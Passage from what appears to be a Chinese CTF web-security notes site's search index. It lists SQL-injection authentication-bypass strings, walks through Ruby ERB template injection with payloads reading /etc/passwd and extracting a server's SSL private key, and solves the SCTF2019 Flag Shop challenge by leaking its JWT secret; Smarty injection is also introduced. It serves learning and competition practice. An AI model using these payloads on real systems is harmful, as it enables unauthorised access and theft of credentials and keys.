<p>\u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u6bd4\u8f83\u65b0\u9c9c\u7684\uff0c\u5f88\u4e45\u6ca1\u56de\u5b9e\u9a8c\u5427\u4e86\u5b66\u5230\u4e86\u5f88\u591a\u7684\u59ff\u52bf~\u4e0d\u5f97\u4e0d\u8bf4\u4e0d\u770b\u63d0\u793a\u771f\u5fc3\u60f3\u4e0d\u5230\u8fd9\u4e9b\uff0c\u55ef\u3002\u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3\u9898\u76ee\u4e2dphp\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u9996\u5148\u5ba1\u6e90\u7801\u5f97\u5230\u4e86source.txt\u5f97\u5230\u4e86\u6e90\u7801\uff0c\u7136\u540e\u6211\u4eec\u770b\u4e00\u4e0b\u6e90\u7801\u5e72\u4e86\u4ec0\u4e48\uff0c\u4e3b\u8981\u5c31\u662f\u4e00\u4e2a\u767b\u9646\u8ba4\u8bc1\uff01&lt;?phperror_reporting(0);if (!isset(_POST['uname']) || !isset(_POST['pwd'])) {</p> <p>https://blog.csdn.net/qq_35078631/article/details/54772798</p> <p>MySQL GROUP BY \u8bed\u53e5 | \u83dc\u9e1f\u6559\u7a0b</p> <p>MySQL GROUP BY \u8bed\u53e5  GROUP BY \u8bed\u53e5\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u3002 \u5728\u5206\u7ec4\u7684\u5217\u4e0a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 COUNT, SUM, AVG,\u7b49\u51fd\u6570\u3002 GROUP BY \u8bed\u6cd5  SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name;   \u5b9e\u4f8b\u6f14\u793a \u672c\u7ae0\u8282\u5b9e\u4f8b..</p> <p>http://www.runoob.com/mysql/mysql-group-by-statement.html</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","title":"\u4e07\u80fd\u5bc6\u7801","text":"<p>\u53ea\u662f\u8fd9\u4e48\u4e2a\u53eb\u6cd5\u800c\u5df2</p> <p>\u4f5c\u7528\u53ea\u80fd\u8bf4\u662f\u666e\u666e\u901a\u901a\u3002</p> <pre><code>'or 1=1/*\n\"or \"a\"=\"a\n\"or 1=1--\n\"or\"=\"\n\"or\"=\"a'='a\n\"or1=1--\n\"or=or\"\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or\"=\"a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1-- asp aspx \"or \"a\"=\"a\n'.).or.('.a.'='.a\nor 1=1--\n'or 1=1--\na'or' 1=1--\n\"or 1=1--\n'or.'a.'='a\n\"or\"=\"a'='a\n'or''='\nor'='or' jsp 1'or'1'='1\nadmin' or 1=1/*\nPlain Text\n</code></pre>"},{"location":"web/ssti/erb%E6%B3%A8%E5%85%A5/","title":"erb\u6ce8\u5165","text":"<p>\u6e90\u81earuby</p> <p></p> <p>\u4f7f\u7528\u9884\u89c8\uff08preview\uff09\u6309\u94ae\u63d0\u4ea4\u8868\u683c\u540e\uff0c\u5448\u73b0\u5728\u6211\u4eec\u773c\u524d\u662f\u5305\u542b\u7528\u6237\u4fe1\u606f\u4ee5\u53ca\u7528\u6237\u521b\u5efa\u65f6\u95f4\u7684\u4e00\u4e2a\u9875\u9762\uff1a</p> <p>\u89c2\u5bdf\u4ee3\u7801\u4e2d\u83b7\u53d6username\u4ee5\u53catombstone\u65f6\u6240\u4f7f\u7528\u7684\u8bed\u6cd5\uff0c\u6839\u636e\u5176\u4e2d\u7684&lt;%=\u8bed\u6cd5\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9bRuby\u6280\u672f\uff0c\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u8fd9\u6bb5\u4ee3\u7801\u5c5e\u4e8eRuby/ERB\u4ee3\u7801\u3002\u57fa\u4e8e\u8fd9\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u8f91\u8f93\u5165\u6570\u636e\uff0c\u6d4b\u8bd5\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u6a21\u677f\u6ce8\u5165\u3002\u5927\u81f4\u6d4f\u89c8ERB\u6587\u6863\u540e\uff0c\u6211\u4eec\u4e86\u89e3\u5230&lt;%=\u8bed\u6cd5\u53ef\u4ee5\u7528\u6765\u6267\u884cRuby\u8bed\u53e5\uff0c\u5e76\u4f1a\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u4ee5\u9644\u5728\u6700\u7ec8\u7684\u7ed3\u679c\u6587\u672c\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u653b\u51fb\u8f7d\u8377\u6765\u5c1d\u8bd5\u6267\u884c\u6570\u5b66\u8fd0\u7b97\uff1a</p> <p></p> <p>\u6211\u60f3\u8bf4\u7684\u662f\uff0c\u8bb0\u4f4f\u8fd9\u4e2a\u9875\u9762\uff01\uff01\uff01</p> <p>\u800c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff1a</p> <p>ruby &lt;%= 7 * 7 %&gt;</p> <p>\u8fd0\u7b97\u7ed3\u679c\u4e3a49\uff0c\u6bcf\u4e2a\u7528\u6237\u90fd\u4f1a\u6253\u5370\u4e00\u6b21\u8fd0\u7b97\u7ed3\u679c</p> <p></p> <p>ruby &lt;%= File.open(\u2018/etc/passwd\u2019).read %&gt;</p> <p>\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u3002\u975e\u5e38\u597d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bd5\u8bd5\u770b\u80fd\u5426\u6267\u884c\u51fd\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u6765\u6d4b\u8bd5\u81ea\u5e26\u7684\u5168\u5c40\u51fd\u6570\u662f\u5426\u80fd\u7528\u5230\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5982\u4e0b\u8fd9\u79cd\u8f7d\u8377\uff1a</p> <p></p> <p>\u641e\u5b9a\u3002</p> <p>\u7531\u4e8e\u4e0d\u5b89\u5168\u64cd\u4f5c\u7684\u539f\u56e0\uff0c\u7cfb\u7edf\u963b\u6b62\u6211\u4eec\u8bbf\u95eeFile.open\u51fd\u6570\u3002Ruby\u7684ERB\u6a21\u677f\u5f15\u64ce\u5305\u542b\u4e00\u4e2a\u5b89\u5168\u7ea7\u522b\uff08safe level\uff09\u53c2\u6570\uff0c\u5f53\u5b89\u5168\u7ea7\u522b\u8bbe\u7f6e\u4e3a0\u4ee5\u4e0a\u7684\u67d0\u4e2a\u503c\uff08\u6bd4\u59823\uff09\u65f6\uff0c\u6211\u4eec\u65e0\u6cd5\u5728\u6a21\u677f\u7ed1\u5b9a\uff08template binding\uff09\u4e2d\u6267\u884c\u5305\u62ec\u6587\u4ef6\u64cd\u4f5c\u5728\u5185\u7684\u67d0\u4e9b\u51fd\u6570\u3002\u5982\u679c\u5e94\u7528\u4f7f\u7528\u7684\u5b89\u5168\u7ea7\u522b\u4e3a4\uff0c\u90a3\u4e48\u5b83\u4f1a\u4f7f\u7528\u6700\u4e3a\u4e25\u683c\u7684\u9694\u79bb\u673a\u5236\uff0c\u53ea\u80fd\u6267\u884c\u6807\u8bb0\u4e3a\u53ef\u4fe1\u72b6\u6001\u7684\u90a3\u4e9b\u4ee3\u7801\u3002\u56e0\u6b64\uff0c\u770b\u6837\u5b50\u7ba1\u7406\u5458\u5728\u8fd9\u4e2a\u6a21\u677f\u5f15\u64ce\u4e2d\u8bbe\u7f6e\u4e86\u5b89\u5168\u7ea7\u522b\u3002\u867d\u7136\u6211\u4eec\u7684\u653b\u51fb\u4e0d\u4f1a\u50cf\u8bfb\u5199\u786c\u76d8\u6587\u4ef6\u90a3\u6837\u7b80\u5355\uff0c\u4f46\u8fd9\u91cc\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u8bb8\u591a\u653b\u51fb\u9762\u3002\u6bd4\u5982\uff0c\u5bf9\u4e8e\u76ee\u524d\u53ef\u7528\u7684\u8fd9\u4e9b\u5c0f\u5de5\u5177\uff08gadget\uff09\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u4ec0\u4e48\u64cd\u4f5c\uff1f\u5982\u679c\u6211\u4eec\u60f3\u5206\u6790self\u5bf9\u8c61\uff08self-object\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u679a\u4e3e\u8be5\u5bf9\u8c61\u53ef\u7528\u7684\u5c5e\u6027\u53ca\u65b9\u6cd5\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\uff1a</p> <p>ruby&lt;%= self %&gt;</p> <p></p> <p>\u7ed3\u679c\u770b\u8d77\u6765\u5c31\u662fRuby\u7684\u98ce\u683c\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8bd5\u7740\u83b7\u53d6self\u5bf9\u8c61\u7684\u7c7b\u540d\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.class.name\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u7c7b\u540d\u4e3a\u201cTemplateInjection\u201d\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u201c\u8bbf\u95ee\u201d\u8fd9\u4e2a\u63a7\u5236\u63a5\u53e3\uff0c\u6211\u4eec\u80fd\u7528\u5b83\u6765\u5e72\u5565\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u679a\u4e3eTemplateInjection\u7c7b\u7684\u53ef\u7528\u65b9\u6cd5\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.methods\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u8fd9\u4e9b\u51fd\u6570\uff0c\u601d\u8003\u54ea\u4e9b\u6570\u636e\u53ef\u4ee5\u4f20\u9012\u7ed9\u8fd9\u4e9b\u51fd\u6570\uff0c\u4ee5\u5b9e\u73b0\u672a\u6388\u6743\u8bbf\u95ee\u76ee\u7684\u3002\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695a\u8be5\u5e94\u7528\u5177\u4f53\u4f7f\u7528\u7684web\u6846\u67b6\uff0c\u4f46\u7531\u4e8e\u6211\u4eec\u6b63\u5f80\u670d\u52a1\u5668\u53d1\u9001HTTP POST\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u731c\u5230\u6211\u4eec\u5f88\u6709\u53ef\u80fd\u5904\u4e8ehandlePOST\u6216\u8005doPOST\u51fd\u6570\u5185\u90e8\u3002\u4e5f\u8bb8\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u8bbf\u95ee\u67d0\u4e9b\u5c40\u90e8\u53d8\u91cf\u3002</p> <p>\u5982\u679c\u5927\u5bb6\u4e0d\u719f\u6089Ruby\uff0c\u8fd9\u91cc\u6211\u7a0d\u5fae\u4ecb\u7ecd\u4e0b\u3002Ruby\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5143\u7f16\u7a0b\uff08metaprogramming\uff09\u4ee5\u53ca\u5185\u7701\uff08introspection\uff09\u529f\u80fd\uff0c\u8bfb\u8005\u53ef\u4ee5\u8bbf\u95ee\u6b64\u94fe\u63a5\u4e86\u89e3\u66f4\u591a\u7ec6\u8282\u3002\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u67d0\u4e9b\u529f\u80fd\uff08\u5982\u524d\u9762\u63d0\u5230\u7684\u7c7b\u7684.methods\u4ee5\u53ca.name\u65b9\u6cd5\uff09\u6765\u63a2\u7d22\u7a0b\u5e8f\u7684\u5185\u90e8\u7ed3\u6784\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\u83b7\u53d6\u76ee\u6807\u6240\u9700\u7684\u5177\u4f53\u53c2\u6570\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.method(:handle_POST).parameters\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u4ece\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u53ef\u77e5handle_POST\u9700\u89813\u4e2areq\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u67d0\u4e2a\u8bf7\u6c42\uff08request\uff09\u5bf9\u8c61\uff1brsp\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u54cd\u5e94\u6570\u636e\u7684\u5f15\u7528\uff1b\u6700\u540e\u7684session\u53c2\u6570\u53ef\u80fd\u662f\u67d0\u4e2aid\u6216\u8005\u67d0\u4e2a\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\uff0c\u4ee5\u786e\u8ba4session\u5bf9\u8c61\u7684\u5177\u4f53\u542b\u4e49\uff0c\u4f7f\u7528\u7684\u8f7d\u8377\u5982\u4e0b\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0session.class.name\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u4e0a\u8ff0\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u662f\u201cWEBrick\u201d\uff0c\u8fd9\u662fRuby\u5728\u6807\u51c6\u5e93\u4e2d\u5b9e\u73b0\u7684\u539f\u751fweb\u670d\u52a1\u5668\u3002\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\u8fd9\u4e2asession\u5bf9\u8c61\uff0c\u4f46\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u76ee\u6807\u66f4\u503c\u5f97\u6211\u4eec\u63a2\u7d22\uff0c\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8\u4e0e\u5f53\u524d\u4f1a\u8bdd\u6709\u5173\u7684\u90a3\u4e9b\u6570\u636e\u3002\u7b80\u5355\u7ffb\u9605WEBrick\u6587\u6863\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u67d0\u4e9b\u53d8\u91cf\u4f1a\u4f20\u9012\u7ed9Servlet\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u5185\u7701\uff08introspection\uff09\u65b9\u6cd5\uff0c\u4ee5\u786e\u8ba4\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u53d8\u91cf\u4ee5\u53ca\u5176\u4ed6\u53ef\u7528\u53d8\u91cf\u3002</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u5f53WEBrick\u88ab\u5b9e\u4f8b\u5316\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u5c06\u67d0\u4e2ahttp\u670d\u52a1\u5668\u5b9e\u4f8b\u4f20\u9012\u7ed9servlet\uff0c\u8fd9\u5f88\u6709\u53ef\u80fd\u5c31\u662f@server\u8fd9\u4e2a\u5b9e\u4f8b\u53d8\u91cf\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bc1\u5b9e\u8fd9\u4e2a\u731c\u60f3\uff0c\u540c\u65f6\u89c2\u5bdf\u8fd9\u4e2a\u5bf9\u8c61\u5305\u542b\u54ea\u4e9b\u6210\u5458\u53d8\u91cf\u3002\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528.instance_variables\u65b9\u6cd5\u6765\u8bc1\u5b9e\u8fd9\u4e00\u70b9\uff1a</p> <pre><code>ruby\u00a0&lt;%=@server.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>ruby\u00a0&lt;%\u00a0ssl=@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>@key\u770b\u8d77\u6765\u975e\u5e38\u6709\u8da3\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u8fd9\u4e2a\u503c\uff1a</p> <pre><code>ruby\u00a0&lt;%\u00a0ssl\u00a0=\u00a0@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variable_get(:@key)\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>ruby &lt;%= self %&gt;\nruby &lt;%= self.class.name %&gt;\nruby &lt;%= self.methods %&gt;\nruby &lt;%= self.method(:handle_POST).parameters %&gt;\n----\nruby &lt;%= session.class.name %&gt;\nruby &lt;%= self.instance_variables %&gt;\nruby &lt;%=@server.instance_variables %&gt;\nruby &lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;\nruby &lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;\u5176\u5b9e\u5c31\u662f\u4e2a\u6c99\u76d2\u9003\u9038\uff1f\nPlain Text\n</code></pre> <p>\u7406\u89e3flask\u4e4b\u540e\u770b\u8fd9\u4e2a\u591a\u591a\u5c11\u5c11\u90fd\u80fd\u770b\u61c2\u5927\u90e8\u5206\u5427\uff0c\u5bf9\u5427\u5bf9\u5427\u5bf9\u5427\uff1f</p>"},{"location":"web/ssti/erb%E6%B3%A8%E5%85%A5/#ruby","title":"ruby\u9884\u5b9a\u4e49\u53d8\u91cf","text":"<p>\u9884\u5b9a\u4e49\u53d8\u91cf\uff1a</p> <pre><code>Pre-defined variables\n$!\nThe exception information message set by 'raise'.\n$@\nArray of backtrace of the last exception thrown.\n$&amp;\nThe string matched by the last successful match.\n$`\nThe string to the left of the last successful match.\n$'\nThe string to the right of the last successful match.\n$+\nThe highest group matched by the last successful match.\n$1\nThe Nth group of the last successful match. May be &gt; 1.\n$~\nThe information about the last match in the current scope.\n$=\nThe flag for case insensitive, nil by default.\n$/\nThe input record separator, newline by default.\n$\\\nThe output record separator for the print and IO#write. Default is nil.\n$,\nThe output field separator for the print and Array#join.\n$;\nThe default separator for String#split.\n$.\nThe current input line number of the last file that was read.\n$&lt;\nThe virtual concatenation file of the files given on command line (or from $stdin if no files were given).\n$&gt;\nThe default output for print, printf. $stdout by default.\n$_\nThe last input line of string by gets or readline.\n$0\nContains the name of the script being executed. May be assignable.\n$*\nCommand line arguments given for the script sans args.\n$$\nThe process number of the Ruby running this script.\n$?\nThe status of the last executed child process. This value is thread-local.\n$:\nLoad path for scripts and binary modules by load or require.\n$\u201c\nThe array contains the module names loaded by require.\n$DEBUG\nThe debug flag, which is set by the -d switch. Enabling debug output prints each exception raised to $stderr (but not its backtrace). Setting this to a true value enables debug output as if -d were given on the command line. Setting this to a false value disables debug output.\n$LOADED_FEATURES\nThe alias to the $\u201c.\n$FILENAME\nCurrent input file from $&lt;. Same as $&lt;.filename.\n$LOAD_PATH\nThe alias to the $:.\n$stderr\nThe current standard error output.\n$stdin\nThe current standard input.\n$stdout\nThe current standard output.\n$VERBOSE\nThe verbose flag, which is set by the -w or -v switch. Setting this to a true value enables warnings as if -w or -v were given on the command line. Setting this to nil disables warnings, including from Kernel#warn.\n$-0\nThe alias to $/.\n$-a\nTrue if option -a is set. Read-only variable.\n$-d\nThe alias of $DEBUG. See $DEBUG above for further discussion.\n$-F\nThe alias to $;.\n$-i\nIn in-place-edit mode, this variable holds the extension, otherwise nil.\n$-I\nThe alias to $:.\n$-l\nTrue if option -l is set. Read-only variable.\n$-p\nTrue if option -p is set. Read-only variable.\n$-v\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\n$-w\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\nPre-defined global constants\nTRUE\nThe typical true value.\nFALSE\nThe false itself.\nNIL\nThe nil itself.\nSTDIN\nThe standard input. The default value for $stdin.\nSTDOUT\nThe standard output. The default value for $stdout.\nSTDERR\nThe standard error output. The default value for $stderr.\nENV\nThe hash contains current environment variables.\nARGF\nThe alias to the $&lt;.\nARGV\nThe alias to the $*.\nDATA\nThe file object of the script, pointing just after __END__.\nRUBY_VERSION\nThe ruby version string (VERSION was deprecated).\nRUBY_RELEASE_DATE\nThe release date string.\nRUBY_PLATFORM\nThe platform identifier.\u5728\u5b98\u65b9\u6587\u6863https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u7ed9\u4e2a\u4f8b\u9898</p> <p>[SCTF2019]Flag Shop</p> <p>JWT\u4f2a\u9020\u90e8\u5206\u8df3\u8fc7\uff0c\u53ea\u5173\u6ce8\u5176\u4e2d\u7684erb\u6a21\u677f\u6ce8\u5165\u90e8\u5206\uff1b</p> <p>\u6e90\u7801\uff1a</p> <pre><code>require 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\nset :public_folder, File.dirname(__FILE__) + '/static'\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\nconfigure do\nenable :logging\nfile = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\nfile.sync = true\nuse Rack::CommonLogger, file\nend\nget \"/\" do\nredirect '/shop', 302\nend\nget \"/filebak\" do\ncontent_type :text\nerb IO.binread __FILE__\nend\nget \"/api/auth\" do\npayload = { uid: SecureRandom.uuid , jkl: 20}\nauth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nend\nget \"/api/info\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\njson({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\nget \"/shop\" do\nerb :shop\nend\nget \"/work\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nauth = auth[0]\nunless params[:SECRET].nil?\nif ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\nputs ENV[\"FLAG\"]\nend\nend\nif params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\npost \"/shop\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nif auth[0][\"jkl\"] &lt; FLAGPRICE then\njson({title: \"error\",message: \"no enough jkl\"})\nelse\nauth &lt;&lt; {flag: ENV[\"FLAG\"]}\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\njson({title: \"success\",message: \"jkl is good thing\"})\nend\nend\n\ndef islogin\nif cookies[:auth].nil? then\nredirect to('/shop')\nend\nend\nPlain Text\n</code></pre> <p>\u91cd\u70b9\u4ee3\u7801</p> <pre><code>if params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\nRuby\n</code></pre> <p>\u5173\u952e\u5728\u4e8e\uff1a</p> <pre><code>\"&lt;script&gt;alert('#{params[:name][0,7]}working successfully!')&lt;/script&gt;\"If do=name,\u7136\u540e\u622a\u53d6\u8fd98\u4e2a\u5b57\u7b26{\u5982\u679c\u6211\u4f20\u5165\u7684\u662f&lt;%7 *7 %&gt; }\u53d1\u73b0\u662f\u8fd4\u56de49\uff0c\u6a21\u677f\u6ce8\u5165\u9884\u5b9a\uff0c\u7136\u540e\u8fd9\u4e2a$\u2019\u5c31\u5f88\u50cf\u6b63\u5219\u5339\u914d\u4e00\u6837\u7684\u4e1c\u897f\uff0c\u89e3\u91ca\u662f\uff1aThe string to the right of the last successful match.\u5f88\u4e0d\u5e78\u8fd0\u7684\u7684\u5c31\u662f\u2026\u8fd9\u91cc\u5c31\u662f\u90a3\u4e2a\u4ea7\u751f\u7684\u968f\u673a\u5bc6\u94a5\u3002\nPlain Text\n</code></pre> <p>$'-\u6700\u540e\u4e00\u6b21\u6210\u529f\u5339\u914d\u53f3\u8fb9\u7684\u5b57\u7b26\u4e32</p> <p>\uff08\u73af\u5883\u5173\u7cfb\uff0c\u6211\u4e0d\u592a\u4f1a\u5f04\uff0c\u4f46\u662f\u5173\u6ce8\u70b9\u5e94\u8be5\u662fruby\u4e2d\u7684\u6b63\u5219\u5339\u914d\u6a21\u5f0f\u4e5f\u5373\uff1a~\u548cmatch\uff09</p> <p>\u6784\u9020do=&lt;%=\u2019%&gt;is working\u548cname=&lt;%=\u2019%&gt;,\u8bb0\u5f97\u628a\u91cc\u9762\u5185\u5bb9\u8f6c\u6210\u5341\u516d\u8fdb\u5236</p> <p>\u6240\u4ee5\u6700\u7ec8\u5c31\u662f</p> <p>SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</p>"},{"location":"web/ssti/php/","title":"PHP\u6a21\u677f","text":"<p>\u5355\u72ec\u62c9flask\u6765\u8bf4\u662f\u56e0\u4e3a\u5b83\u5b9e\u5728\u662f\u611f\u89c9\u975e\u5e38\u91cd\u8981\uff0c\u800c\u4e14\u662f\u7406\u89e3\u8fd0\u7528\u5176\u4ed6\u6a21\u677f\u7684\u57fa\u7840\uff08c\u8bed\u8a00\uff1f\uff09</p> <p>\u63a5\u4e0b\u6765\u662f\u4e24\u4e2aphp\u76f8\u5173\u7684\u6a21\u677f</p>"},{"location":"web/ssti/php/#smarty","title":"smarty","text":"<p>Smarty\u662f\u4e00\u4e2aPHP\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u63d0\u4f9b\u8ba9\u7a0b\u5e8f\u903b\u8f91\u4e0e\u9875\u9762\u663e\u793a\uff08HTML/CSS\uff09\u4ee3\u7801\u5206\u79bb\u7684\u529f\u80fd\u3002</p> <p>\u8fd9\u4e2a\u6a21\u677f\u597d\u50cf\u662f\u6709\u4e9b\u5e74\u5934\u4e86\uff0c\u78b0\u5230\u7684\u6b21\u6570\u4e5f\u662f\u5f88\u5c11\uff0c\u4f46\u6bd4\u8d5b\u53ef\u4e0d\u4f1a\u7ba1\u4f60\u5b66\u6ca1\u5b66\u4f1a\u4e0d\u4f1a\uff0c\u6240\u4ee5\u8fd8</p> <p>\u662f\u5728\u8fd9\u7b80\u5355\u7684\u4ecb\u7ecd\u4ecb\u7ecd\u3002\uff08\u6211\u662f\u60f3\u62c9\u4e2a\u4f8b\u9898\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u5230\uff09</p> <p>\u5229\u7528\u65b9\u5f0f\uff1a\uff08\u642c\u8fd0\u5de5</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u8f93\u5165{$smarty.version}\u5c31\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684smarty\u7684\u7248\u672c\u53f7</p> <p>Smarty\u652f\u6301\u4f7f\u7528<code>{php}{/php}</code>\u6807\u7b7e\u6765\u6267\u884c\u88ab\u5305\u88f9\u5176\u4e2d\u7684php\u6307\u4ee4\uff0c\u6700\u5e38\u89c4\u7684\u601d\u8def\u81ea\u7136\u662f\u5148\u6d4b\u8bd5\u8be5\u6807\u7b7e\u3002\uff08Smarty\u5df2\u7ecf\u5e9f\u5f03{php}\u6807\u7b7e\uff0c\u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u3002\u5728Smarty 3.1\uff0c{php}\u4ec5\u5728SmartyBC\u4e2d\u53ef\u7528\u3002\uff09</p> <p><code>{literal}</code>\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u6a21\u677f\u533a\u57df\u7684\u5b57\u7b26\u539f\u6837\u8f93\u51fa\u3002 \u8fd9\u7ecf\u5e38\u7528\u4e8e\u4fdd\u62a4\u9875\u9762\u4e0a\u7684Javascript\u6216css\u6837\u5f0f\u8868\uff0c\u907f\u514d\u56e0\u4e3aSmarty\u7684\u5b9a\u754c\u7b26\u800c\u9519\u88ab\u89e3\u6790\u3002</p> 